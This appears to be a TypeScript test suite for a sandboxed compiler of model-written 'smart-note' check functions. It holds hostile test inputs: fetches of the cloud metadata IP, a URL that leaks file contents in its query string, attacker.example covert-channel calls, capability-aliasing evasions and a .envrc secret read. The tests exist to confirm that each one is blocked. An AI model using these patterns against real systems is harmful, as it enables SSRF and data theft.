import { afterEach, describe, expect, mock, test } from "bun:test";
import { readFileSync } from "node:fs";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import type { PluginContext } from "../../../plugin/types";
import { _resetKeepSubagentsForTesting, setKeepSubagents } from "../../../shared/keep-subagents";
import { createSmartNoteCapabilities, type SmartNoteCapabilityApi } from "./capabilities";
import {
    bindDeclaredRequests,
    compileSmartNoteCheck,
    isValidSmartNoteCron,
    manifestAdvisoryWarnings,
    normalizeCompiledCheck,
    normalizeCron,
    normalizeManifest,
    parseCompilerOutput,
} from "./compiler";
import { runCompiledSmartNoteCheck } from "./sandbox-runner";
import { SmartNoteNetworkError, SmartNoteSecurityError } from "./types";

const fakeCap: SmartNoteCapabilityApi = {
    readFile: async (filePath) => (filePath === "ready.txt" ? "ready" : null),
    gitHeadSha: async () => "abc123",
    gitTag: async () => "v1.2.3",
    gitLog: async () => [{ sha: "abc", subject: "initial", authorDate: "2026-01-01T00:00:00Z" }],
    httpGet: async () => ({ status: 200, body: "ok" }),
};

async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
    const dir = await mkdtemp(path.join(tmpdir(), "eidnara-smart-note-compiler-"));
    try {
        return await fn(dir);
    } finally {
        await rm(dir, { recursive: true, force: true });
    }
}

const VALID_CHECK = `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" }; }`;

function compilerOutput(compiledCheck: string): string {
    return JSON.stringify({
        compiled_check: compiledCheck,
        manifest: { capabilities: ["readFile"], readFiles: ["ready.txt"] },
        check_cron: "*/15 * * * *",
    });
}

function createCompilerClient(
    outputs: string[],
    options: { prompt?: (input: { signal?: AbortSignal }) => Promise<void> } = {},
) {
    let promptCount = 0;
    const client = {
        session: {
            create: mock(async () => ({ data: { id: "compile-child" } })),
            prompt: mock(async (input: { signal?: AbortSignal }) => {
                promptCount += 1;
                await options.prompt?.(input);
            }),
            messages: mock(async () => ({
                data: [
                    {
                        info: { role: "assistant", time: { created: Date.now() } },
                        parts: [{ type: "text", text: outputs[promptCount - 1] ?? "" }],
                    },
                ],
            })),
            abort: mock(async () => ({ data: true })),
            delete: mock(async () => ({ data: undefined })),
        },
    };
    return client as typeof client & PluginContext["client"];
}

function compileArgs(
    client: PluginContext["client"],
    overrides: Partial<Parameters<typeof compileSmartNoteCheck>[0]> = {},
) {
    return {
        client,
        parentSessionId: "ses-parent",
        sessionDirectory: "/repo/project",
        projectIdentity: "/repo/project",
        note: { id: 7, content: "ship it", surfaceCondition: "when ready.txt says ready" },
        capabilityFactory: () => fakeCap,
        signal: new AbortController().signal,
        deadline: Date.now() + 30_000,
        ...overrides,
    };
}

afterEach(() => {
    _resetKeepSubagentsForTesting();
});

describe("compileSmartNoteCheck", () => {
    test("returns before creating a session when the deadline has already passed", async () => {
        const client = createCompilerClient([compilerOutput(VALID_CHECK)]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { deadline: Date.now() - 1 }),
        );

        expect(result).toEqual({
            ok: false,
            cancelled: false,
            error: "smart-note compile deadline expired",
        });
        expect(client.session.create).not.toHaveBeenCalled();
        expect(client.session.prompt).not.toHaveBeenCalled();
    });

    test("stops at the deadline instead of giving a fallback model a fresh budget", async () => {
        const hangUntilAborted = (input: { signal?: AbortSignal }) =>
            new Promise<void>((_, reject) => {
                input.signal?.addEventListener("abort", () => reject(new Error("aborted")), {
                    once: true,
                });
            });
        const client = createCompilerClient(
            [compilerOutput(VALID_CHECK), compilerOutput(VALID_CHECK)],
            { prompt: hangUntilAborted },
        );

        const result = await compileSmartNoteCheck(
            compileArgs(client, {
                deadline: Date.now() + 50,
                fallbackModels: ["fallback/model"],
            }),
        );

        expect(result).toEqual({
            ok: false,
            cancelled: false,
            error: "smart-note compile deadline expired",
        });
        expect(client.session.prompt).toHaveBeenCalledTimes(1);
    });

    test("reports an external abort as cancelled", async () => {
        const controller = new AbortController();
        const client = createCompilerClient([compilerOutput(VALID_CHECK)], {
            prompt: async () => {
                controller.abort();
                throw new Error("aborted");
            },
        });

        const result = await compileSmartNoteCheck(
            compileArgs(client, { signal: controller.signal }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.cancelled).toBe(true);
    });

    test("tries a fallback model when the primary output fails normalization", async () => {
        const client = createCompilerClient([
            compilerOutput(`async function check(cap) { return { met: true }; }`),
            compilerOutput(VALID_CHECK),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, {
                model: "primary/model",
                fallbackModels: ["fallback/model"],
            }),
        );

        expect(result.ok).toBe(true);
        expect(client.session.prompt).toHaveBeenCalledTimes(2);
        const promptCalls = client.session.prompt.mock.calls as unknown as Array<
            [{ body: { model?: { providerID: string; modelID: string } } }]
        >;
        expect(promptCalls[1][0].body.model).toEqual({ providerID: "fallback", modelID: "model" });
    });

    test("tries a fallback model when the primary check fails its dry run", async () => {
        const client = createCompilerClient([
            compilerOutput(`function check(cap) { throw new Error("boom"); }`),
            compilerOutput(VALID_CHECK),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { fallbackModels: ["fallback/model"] }),
        );

        expect(result.ok).toBe(true);
        expect(client.session.prompt).toHaveBeenCalledTimes(2);
    });

    test("reports a dry-run failure when no fallback model is configured", async () => {
        const client = createCompilerClient([
            compilerOutput(`function check(cap) { throw new Error("boom"); }`),
        ]);

        const result = await compileSmartNoteCheck(compileArgs(client));

        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.cancelled).toBe(false);
            expect(result.error).toContain("dry-run failed");
        }
        expect(client.session.prompt).toHaveBeenCalledTimes(1);
    });

    test("accepts a check whose declared host is unreachable, with the dry run pending", async () => {
        const httpGet = mock(async () => {
            throw new SmartNoteNetworkError("SMART_NOTE_NETWORK: connect ECONNREFUSED");
        });
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { return { met: cap.httpGet("https://down.example/health").status === 200 }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, {
                capabilityFactory: () => ({ ...fakeCap, httpGet }),
                fallbackModels: ["fallback/model"],
            }),
        );

        expect(result.ok).toBe(true);
        if (result.ok) {
            expect(result.dryRun).toBeNull();
            expect(result.dryRunNetworkError).toContain("ECONNREFUSED");
            expect(result.checkHash).toHaveLength(64);
        }
        expect(client.session.prompt).toHaveBeenCalledTimes(1);
    });

    test("does not accept a guest-thrown error that merely carries the network marker", async () => {
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { throw new Error("SMART_NOTE_NETWORK: SmartNoteNetworkError pretend"); }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(compileArgs(client));

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("dry-run failed");
    });

    test("does not waive a check that catches the network failure and then fails otherwise", async () => {
        const httpGet = mock(async () => {
            throw new SmartNoteNetworkError("SMART_NOTE_NETWORK: connect ECONNREFUSED");
        });
        for (const body of [
            `try { cap.httpGet("https://down.example/"); } catch (e) { throw new Error("wrapped " + e.message); }`,
            `try { cap.httpGet("https://down.example/"); } catch (e) { return { met: "nope" }; }`,
        ]) {
            const client = createCompilerClient([
                compilerOutput(`function check(cap) { ${body} return { met: true }; }`),
            ]);

            const result = await compileSmartNoteCheck(
                compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
            );

            expect(result.ok).toBe(false);
            if (!result.ok) expect(result.error).toContain("dry-run failed");
        }
    });

    test("waives the dry run when a later declared URL's failure escapes after an earlier one was caught", async () => {
        const httpGet = mock(async (url: string) => {
            throw new SmartNoteNetworkError(`SMART_NOTE_NETWORK: connect ECONNREFUSED ${url}`);
        });
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { try { cap.httpGet("https://a.example/"); } catch (e) {} cap.httpGet("https://b.example/"); return { met: true }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
        );

        expect(result.ok).toBe(true);
        if (result.ok) {
            expect(result.dryRun).toBeNull();
            expect(result.dryRunNetworkError).toContain("https://b.example/");
        }
    });

    test("bounds child-session deletion so a stalled delete cannot hold the result", async () => {
        const client = createCompilerClient([compilerOutput(VALID_CHECK)]);
        client.session.delete = mock(
            (input: { signal?: AbortSignal }) =>
                new Promise((_, reject) => {
                    input.signal?.addEventListener("abort", () => reject(new Error("aborted")), {
                        once: true,
                    });
                }),
        ) as typeof client.session.delete;

        const startedAt = Date.now();
        const result = await compileSmartNoteCheck(compileArgs(client));

        expect(result.ok).toBe(true);
        expect(Date.now() - startedAt).toBeLessThan(10_000);
        const deleteCall = (
            client.session.delete.mock.calls as unknown as Array<[{ signal?: unknown }]>
        )[0][0];
        expect(deleteCall.signal).toBeInstanceOf(AbortSignal);
    });

    test("returns cancelled without creating a session when the signal is already aborted", async () => {
        const controller = new AbortController();
        controller.abort();
        const client = createCompilerClient([compilerOutput(VALID_CHECK)]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { signal: controller.signal }),
        );

        expect(result).toEqual({
            ok: false,
            cancelled: true,
            error: "smart-note compile cancelled",
        });
        expect(client.session.create).not.toHaveBeenCalled();
    });

    test("passes the compile signal to session creation and transcript fetches", async () => {
        const client = createCompilerClient([compilerOutput(VALID_CHECK)]);

        await compileSmartNoteCheck(compileArgs(client));

        const createCall = (
            client.session.create.mock.calls as unknown as Array<[{ signal?: unknown }]>
        )[0][0];
        expect(createCall.signal).toBeInstanceOf(AbortSignal);
        const messagesCall = (
            client.session.messages.mock.calls as unknown as Array<[{ signal?: unknown }]>
        )[0][0];
        expect(messagesCall.signal).toBeInstanceOf(AbortSignal);
    });

    test("still fails a check whose declared URL the SSRF guard refuses", async () => {
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { cap.httpGet("https://169.254.169.254/latest/meta-data/"); return { met: true }; }`,
            ),
        ]);

        const result = await withTempDir((dir) =>
            compileSmartNoteCheck(
                compileArgs(client, {
                    capabilityFactory: (signal) =>
                        createSmartNoteCapabilities({ projectRoot: dir, signal }),
                }),
            ),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("internal address");
    });

    test("rejects a computed httpGet URL before any code runs", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { cap.httpGet("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("must be a single string literal");
        expect(httpGet).not.toHaveBeenCalled();
    });

    test("rejects an aliased capability call before any code runs", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { const get = cap.httpGet; get("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("cap may only be called directly");
        expect(httpGet).not.toHaveBeenCalled();
    });

    test("deletes the compiler child session unless keep_subagents is set", async () => {
        const deleted = createCompilerClient([compilerOutput(VALID_CHECK)]);
        await compileSmartNoteCheck(compileArgs(deleted));
        expect(deleted.session.delete).toHaveBeenCalledWith(
            expect.objectContaining({ path: { id: "compile-child" } }),
        );

        setKeepSubagents(true);
        const kept = createCompilerClient([compilerOutput(VALID_CHECK)]);
        await compileSmartNoteCheck(compileArgs(kept));
        expect(kept.session.delete).not.toHaveBeenCalled();
    });
});

describe("bindDeclaredRequests", () => {
    const signal = () => new AbortController().signal;

    test("fetches every literal URL before the guest runs and serves only those", async () => {
        const readFile = mock(async (filePath: string) => (filePath === "a.txt" ? "A" : null));
        const httpGet = mock(async (url: string) => ({ status: 200, body: url }));
        const code = `function check(cap) {
            cap.readFile("a.txt");
            if (false) cap.httpGet('https://example.com/never');
            cap.httpGet(\`https://example.com/tpl\`);
            return { met: true };
        }`;

        const { factory } = await bindDeclaredRequests(
            code,
            () => ({ ...fakeCap, readFile, httpGet }),
            signal(),
        );
        expect(httpGet).toHaveBeenCalledTimes(2);
        expect(new Set(httpGet.mock.calls.map((call) => call[0]))).toEqual(
            new Set(["https://example.com/never", "https://example.com/tpl"]),
        );

        const cap = factory(signal());
        await expect(cap.readFile("a.txt")).resolves.toBe("A");
        await expect(cap.httpGet("https://example.com/never")).resolves.toEqual({
            status: 200,
            body: "https://example.com/never",
        });
        await expect(cap.readFile("b.txt")).rejects.toThrow(/not a string literal/);
        await expect(cap.httpGet("https://example.com/tpl?x=1")).rejects.toThrow(
            /not a string literal/,
        );
        expect(httpGet).toHaveBeenCalledTimes(2);
        expect(readFile).toHaveBeenCalledTimes(1);
    });

    test("makes the request set independent of file contents and control flow", async () => {
        const httpGet = mock(async (url: string) => ({ status: 200, body: url }));
        const code = `function check(cap) {
            const bit = (cap.readFile("config.txt") || "").length & 1;
            if (bit) cap.httpGet("https://attacker.example/1"); else cap.httpGet("https://attacker.example/0");
            return { met: true };
        }`;
        const requestsFor = async (config: string) => {
            httpGet.mockClear();
            const { factory } = await bindDeclaredRequests(
                code,
                () => ({ ...fakeCap, readFile: async () => config, httpGet }),
                signal(),
            );
            const result = await runCompiledSmartNoteCheck({
                compiledCheck: code,
                capabilityFactory: factory,
            });
            expect(result.ok).toBe(true);
            return httpGet.mock.calls.map((call) => call[0]).sort();
        };

        const even = await requestsFor("ab");
        const odd = await requestsFor("abc");
        expect(even).toEqual(["https://attacker.example/0", "https://attacker.example/1"]);
        expect(odd).toEqual(even);
    });

    test("does not admit decoy call sites written in comments or strings", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const code = `// cap.httpGet("https://attacker.example/1")
        /* cap.httpGet("https://attacker.example/0") */
        function check(cap) {
            const note = 'cap.httpGet("https://attacker.example/2")';
            return { met: note.length > 0 };
        }`;
        const cap = (
            await bindDeclaredRequests(code, () => ({ ...fakeCap, httpGet }), signal())
        ).factory(signal());

        for (const url of [
            "https://attacker.example/0",
            "https://attacker.example/1",
            "https://attacker.example/2",
        ]) {
            await expect(cap.httpGet(url)).rejects.toThrow(/not a string literal/);
        }
        expect(httpGet).not.toHaveBeenCalled();
    });

    test("stores a fetch failure and rethrows it from the guest call", async () => {
        const unreachable = new SmartNoteNetworkError("SMART_NOTE_NETWORK: connect ECONNREFUSED");
        const code = `function check(cap) { cap.httpGet("https://down.example/"); return { met: true }; }`;
        const bound = await bindDeclaredRequests(
            code,
            () => ({
                ...fakeCap,
                httpGet: async () => {
                    throw unreachable;
                },
            }),
            signal(),
        );
        const cap = bound.factory(signal());

        expect(bound.servedNetworkFailures()).toEqual([]);
        await expect(cap.httpGet("https://down.example/")).rejects.toBe(unreachable);
        expect(bound.servedNetworkFailures()).toEqual([unreachable.message]);
    });

    test("propagates a non-network prefetch failure even for a URL the guest never requests", async () => {
        const code = `function check(cap) { if (cap.gitTag() === "prod") cap.httpGet("https://169.254.169.254/"); return { met: true }; }`;
        await expect(
            bindDeclaredRequests(
                code,
                () => ({
                    ...fakeCap,
                    httpGet: async () => {
                        throw new SmartNoteSecurityError(
                            "URL resolves to a non-global/internal address",
                        );
                    },
                }),
                signal(),
            ),
        ).rejects.toThrow(/internal address/);
    });

    test("rejects a terminal network failure instead of storing it for a dry-run waiver", async () => {
        const code = `function check(cap) { cap.httpGet("https://large.example/"); return { met: true }; }`;
        await expect(
            bindDeclaredRequests(
                code,
                () => ({
                    ...fakeCap,
                    httpGet: async () => {
                        throw new SmartNoteNetworkError(
                            "SMART_NOTE_NETWORK: response body too large",
                            { terminal: true },
                        );
                    },
                }),
                signal(),
            ),
        ).rejects.toThrow(/cannot succeed.*response body too large/);
    });
});

describe("smart-note compiler runtime boundary", () => {
    test("blocks .envrc reads at runtime", async () => {
        await withTempDir(async (dir) => {
            await writeFile(path.join(dir, ".envrc"), "SECRET=1", "utf8");
            const result = await runCompiledSmartNoteCheck({
                compiledCheck: `function check(cap) { return { met: cap.readFile(".envrc") !== null }; }`,
                capabilities: createSmartNoteCapabilities({
                    projectRoot: dir,
                    signal: new AbortController().signal,
                }),
            });

            expect(result).toEqual({ ok: true, result: { met: false } });
        });
    });

    test("blocks internal metadata IP fetches at runtime", async () => {
        await withTempDir(async (dir) => {
            const result = await runCompiledSmartNoteCheck({
                compiledCheck: `function check(cap) { cap.httpGet("https://169.254.169.254/latest/meta-data/"); return { met: true }; }`,
                capabilities: createSmartNoteCapabilities({
                    projectRoot: dir,
                    signal: new AbortController().signal,
                }),
            });

            expect(result.ok).toBe(false);
            if (!result.ok) expect(result.error).toContain("internal address");
        });
    });

    test("enforces sandbox time limits", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check() { while (true) {} }`,
            capabilities: fakeCap,
            timeoutMs: 100,
        });

        expect(result.ok).toBe(false);
    });

    test("enforces sandbox memory limits", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check() { const chunks = []; for (let i = 0; i < 100; i++) chunks.push(new ArrayBuffer(1024 * 1024)); return { met: false }; }`,
            capabilities: fakeCap,
            heapLimitBytes: 64 * 1024,
            timeoutMs: 1_000,
        });

        expect(result.ok).toBe(false);
    });

    test("does not expose the raw host capability bridge to guest code", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" && typeof __eidnaraHostCap === "undefined" && !Object.prototype.hasOwnProperty.call(globalThis, "__eidnaraHostCap") }; }`,
            capabilities: fakeCap,
        });

        expect(result).toEqual({ ok: true, result: { met: true } });
    });

    test("treats manifest drift as advisory instead of enforcement", async () => {
        const compiledCheck = `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" }; }`;
        expect(manifestAdvisoryWarnings(compiledCheck, { capabilities: [] })).toContain(
            "manifest omits capability readFile",
        );

        const result = await runCompiledSmartNoteCheck({ compiledCheck, capabilities: fakeCap });
        expect(result).toEqual({ ok: true, result: { met: true } });
    });
});

describe("smart-note compiler output bounds", () => {
    test("bounds compiler output, source, manifest entries, and cron length", () => {
        expect(() => parseCompilerOutput("x".repeat(128 * 1024 + 1))).toThrow(/128 KiB/);
        expect(() =>
            normalizeCompiledCheck(
                `function check() { return { met: false }; }/*${"x".repeat(64 * 1024)}*/`,
            ),
        ).toThrow(/64 KiB/);
        expect(
            normalizeManifest({
                capabilities: [],
                signals: Array.from({ length: 100 }, (_, index) => `signal-${index}`),
            }).signals,
        ).toHaveLength(64);
        expect(() =>
            normalizeManifest({
                capabilities: [],
                signals: Array.from(
                    { length: 4 },
                    (_, index) => `${index}-${"s".repeat(10 * 1024)}`,
                ),
            }),
        ).toThrow(/32 KiB/);
        expect(() => normalizeCron("*".repeat(257))).toThrow(/256 bytes/);
        expect(normalizeCron("  ")).toBe("0 * * * *");
    });

    test("accepts the daemon's five-field numeric cron grammar and rejects the rest", () => {
        for (const cron of [
            "0 * * * *",
            "*/15 * * * *",
            "0 9-17 * * 1-5",
            "0,30 */2 1,15 * 0",
            "5/10 * * * 7",
            "*/18446744073709551615 * * * *",
            "0 0 * * *",
        ]) {
            expect(isValidSmartNoteCron(cron)).toBe(true);
            expect(normalizeCron(cron)).toBe(cron);
        }
        for (const cron of [
            "not-a-cron",
            "* * * *",
            "* * * * * *",
            "60 * * * *",
            "* 24 * * *",
            "* * 0 * *",
            "* * * 13 *",
            "* * * * 8",
            "*/0 * * * *",
            "*/18446744073709551616 * * * *",
            "5-1 * * * *",
            "1-2-3 * * * *",
            "1/2/3 * * * *",
            ", * * * *",
            "@hourly",
            "0 * * jan *",
        ]) {
            expect(isValidSmartNoteCron(cron)).toBe(false);
            expect(() => normalizeCron(cron)).toThrow(/valid 5-field/);
        }
    });

    test("keeps manifest summaries well-formed at the scalar limit", () => {
        const summary = `${"a".repeat(159)}😀tail`;
        const normalized = normalizeManifest({ capabilities: [], summary });
        expect(normalized.summary).toBe(`${"a".repeat(159)}😀`);
        expect(JSON.parse(JSON.stringify(normalized))).toEqual(normalized);

        const response = JSON.stringify({
            compiled_check: `function check(cap) { return { met: true }; }`,
            manifest: { capabilities: [], summary: "\ud83d" },
            check_cron: "0 * * * *",
        });
        expect(() => parseCompilerOutput(response)).toThrow(/unpaired surrogate/);
    });

    test("treats backtick fences inside the JSON as data, not as a response fence", () => {
        const check = `function check(cap) { const r = cap.readFile("README.md") || ""; return { met: r.includes("\`\`\`json") && r.includes("\`\`\`") }; }`;
        const body = JSON.stringify({
            compiled_check: check,
            manifest: { capabilities: ["readFile"] },
            check_cron: "0 * * * *",
        });
        expect(parseCompilerOutput(body).compiled_check).toBe(check);
        expect(parseCompilerOutput(`\`\`\`json\n${body}\n\`\`\``).compiled_check).toBe(check);
    });

    test("keeps only string capability names", () => {
        expect(
            normalizeManifest({
                capabilities: [["readFile"], "httpGet", 3, null, "bogus"] as unknown as never,
            }).capabilities,
        ).toEqual(["httpGet"]);
    });

    test("rejects capability call sites whose argument is not one string literal", () => {
        for (const call of [
            `cap.httpGet(url)`,
            `cap.httpGet("https://x/?d=" + cap.readFile("a.txt"))`,
            `cap.httpGet(\`https://x/\${id}\`)`,
            `cap.readFile("a.txt", extra)`,
            `cap.readFile(/re/)`,
        ]) {
            expect(() =>
                normalizeCompiledCheck(`function check(cap) { ${call}; return { met: true }; }`),
            ).toThrow(/must be a single string literal/);
        }
        expect(
            normalizeCompiledCheck(
                `function check(cap) { cap.readFile("a.txt"); cap.httpGet('https://x/a'); cap.httpGet(\`https://x/b\`); return { met: true }; }`,
            ),
        ).toContain("function check(cap)");
    });

    test("rejects every use of cap other than a direct capability call", () => {
        const cases: Array<[string, RegExp]> = [
            [
                `function check(cap) { const get = cap.httpGet; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { cap["httpGet"]("https://x/a"); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const { httpGet } = cap; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { return { met: helper(cap) }; } function helper(c) { return true; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { cap?.httpGet("https://x/a"); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const inner = (cap) => cap.gitTag(); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const c = arguments[0]; return { met: true }; }`,
                /must not use arguments/,
            ],
            [
                `function check(c) { return { met: c.gitTag() !== null }; }`,
                /must define function check\(cap\)/,
            ],
            [
                `function check(cap, extra) { return { met: true }; }`,
                /must define function check\(cap\)/,
            ],
            [
                `module.exports.check = (cap) => ({ met: true });`,
                /must define function check\(cap\)/,
            ],
            [
                `function check(cap) { cap.httpGet("https://a/0"); return { met: true }; } function check(x) { return { met: true }; }`,
                /must not reference check outside its declaration/,
            ],
            [
                `function check(cap) { return { met: true }; } check = function (x) { return { met: true }; };`,
                /must not reference check outside its declaration/,
            ],
            [
                `function check(cap) { return { met: true }; } var check = (x) => ({ met: true });`,
                /must not reference check outside its declaration/,
            ],
            [
                `function check(cap) { return { met: true }; } check &&= function (x) { return { met: true }; };`,
                /must not reference check outside its declaration/,
            ],
            [
                `function check(cap) { return { met: __mcCap.gitTag() !== null }; }`,
                /identifiers beginning with __/,
            ],
            [
                `function check(cap) {
                    if (false) { cap.httpGet("https://a/0"); cap.httpGet("https://a/1"); }
                    const g = cap.httpGet;
                    const bit = (cap.readFile("config.txt") || "").length % 2;
                    g(bit ? "https://a/1" : "https://a/0");
                    return { met: true };
                }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let n = 0, get; n++ / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let get; const n = {} / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let get; const n = function(){} / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let get; const n = class {} / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let get; const n = class X extends (class {}) {} / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { let get; const n = class X extends Base.Member {} / (get = cap.httpGet) / 1; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const c = argum\\u0065nts[0]; return { met: true }; }`,
                /escape sequences in identifiers/,
            ],
            [
                `function check(cap) { const c = c\\u0061p; return { met: true }; }`,
                /escape sequences in identifiers/,
            ],
        ];
        for (const [code, error] of cases) {
            expect(() => normalizeCompiledCheck(code)).toThrow(error);
        }
        expect(
            normalizeCompiledCheck(
                `function check(cap) { const tag = cap.gitTag(); const log = cap.gitLog({ maxCount: 3 }); return { met: tag !== null && log.length > 0 && cap.gitHeadSha() !== null }; }`,
            ),
        ).toContain("function check(cap)");
    });

    test("strips export only from the declaration, not from string data", () => {
        const declaration = `export function check(cap) { return { met: true }; }`;
        expect(normalizeCompiledCheck(declaration)).toBe(
            `function check(cap) { return { met: true }; }`,
        );
        const data = `function check(cap) { return { met: (cap.readFile("source.js") || "").includes("export function check(") }; }`;
        expect(normalizeCompiledCheck(data)).toBe(data);
    });

    test("ignores module keywords and call-like text inside strings and comments", () => {
        const code = `// import nothing; cap.httpGet("https://decoy.example/comment")
function check(cap) {
  /* require("fs") is only mentioned here */
  const source = cap.readFile("source.js") || "";
  if (source) /import\\s/.test(source);
  const usesCommonJs = source.includes("require") || /require\\(/.test(source);
  return { met: usesCommonJs && !source.includes("cap.readFile(\\"decoy\\")") };
}`;
        expect(normalizeCompiledCheck(code)).toBe(code);
        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
            "manifest omits readFile path source.js",
        ]);
    });

    test("decodes escape sequences in literal capability arguments", () => {
        const code = `function check(cap) { return { met: cap.readFile("docs\\u002Fa\\x2Db\\n.txt") !== null }; }`;
        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
            "manifest omits readFile path docs/a-b\n.txt",
        ]);
    });
});

describe("wire-limit parity with the Rust module (static)", () => {
    const tsSource = readFileSync(path.join(import.meta.dir, "compiler.ts"), "utf8");
    const rustSource = readFileSync(
        path.join(import.meta.dir, "../../../../../../crates/daemon/src/lib.rs"),
        "utf8",
    );

    test("MAX_MANIFEST_BYTES matches NOTE_EVALUATOR_MAX_MANIFEST_BYTES", () => {
        // TypeScript must reject manifests larger than the module limit.
        const tsLimit = tsSource.match(/const MAX_MANIFEST_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_MANIFEST_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });

    test("MAX_CRON_BYTES matches NOTE_EVALUATOR_MAX_CRON_BYTES", () => {
        const tsLimit = tsSource.match(/const MAX_CRON_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_CRON_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });

    test("MAX_COMPILED_CHECK_BYTES matches NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES", () => {
        const tsLimit = tsSource.match(/const MAX_COMPILED_CHECK_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });
});
